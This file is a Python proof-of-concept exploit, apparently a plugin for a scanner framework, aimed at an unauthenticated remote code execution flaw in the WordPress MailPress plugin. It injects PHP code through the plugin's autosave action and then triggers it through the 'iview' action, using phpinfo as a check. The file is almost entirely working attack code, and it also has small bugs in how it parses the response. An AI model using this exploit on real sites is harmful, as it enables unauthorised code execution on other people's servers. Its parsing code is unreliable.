# Author:w8ay
# Name:测试DEMO
'''
name: wordpress 插件mailpress远程代码执行
referer: http://0day5.com/archives/3960
author: Lucifer
description: Mailpress存在越权调用，在不登陆的情况下，可以调用系统某些方法，造成远程命令执行。
'''

import HackRequests


def poc(arg, **kwargs):
    hack = HackRequests.hackRequests()
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/wp-content/plugins/mailpress/mp-includes/action.php"
    vulnurl = arg + payload
    post_data = {
        "action": "autosave",
        "id": 0,
        "revision": -1,
        "toemail": "",
        "toname": "",
        "fromemail": "",
        "fromname": "",
        "to_list": 1,
        "Theme": "",
        "subject": "<?php phpinfo();?>",
        "html": "",
        "plaintext": "",
        "mail_format": "standard",
        "autosave": 1,
    }
    try:
        hh = hack.http(vulnurl,post=post_data,headers=headers)
        start = hh.text().find("<autosave id=")
        end = hh.text().find("old_id")
        searchkey = hh.text[start:end].strip()
        searchid = searchkey.lstrip("<autosave id='").rstrip("'")
        shellurl = arg + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=" + searchid
        req2 = hack.http(shellurl)
        if r"Configuration File (php.ini) Path" in req2.text():
            result = {
                "name": "wordpress mailpress远程代码执行",  # 插件名称
                "content": "wordpress 插件mailpress远程代码执行漏洞",  # 插件返回内容详情，会造成什么后果。
                "url": arg,  # 漏洞存在url
                "log": req2.log,
                "tag": "code_eval"  # 漏洞标签
            }
            return result
    except:
        pass

if __name__ == "__main__":
    pass